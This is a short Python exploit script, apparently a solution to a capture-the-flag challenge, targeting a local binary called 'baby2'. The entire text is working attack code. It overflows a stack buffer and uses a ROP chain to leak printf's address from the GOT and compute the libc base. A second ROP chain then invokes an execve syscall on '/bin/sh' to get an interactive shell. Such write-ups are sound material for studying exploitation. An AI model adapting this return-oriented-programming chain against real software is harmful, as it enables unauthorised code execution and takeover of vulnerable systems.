from ptrlib import *

libc = ELF("./libc.so.6")
elf = ELF("./baby2")
sock = Process("./baby2")

rop_pop_rdi = 0x00400783
plt_puts = 0x400550

# Leak libc base
payload = b'A' * 0x18
payload += p64(rop_pop_rdi)
payload += p64(elf.got("printf"))
payload += p64(plt_puts)
payload += p64(elf.symbol("main"))
sock.recvuntil("input: ")
sock.sendline(payload)
addr_printf = u64(sock.recvline().rstrip())
libc_base = addr_printf - libc.symbol("printf")
dump("libc base = " + hex(libc_base))

rop_pop_rax = libc_base + 0x000439c7
rop_pop_rdx = libc_base + 0x00001b96
rop_pop_rdi = libc_base + 0x0002155f
rop_pop_rsi = libc_base + 0x00023e6a
rop_syscall = libc_base + 0x000013c0

# Get the shell!
payload = b'A' * 0x18
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(rop_pop_rsi)
payload += p64(0)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
sock.recvuntil("input: ")
sock.sendline(payload)

sock.interactive()
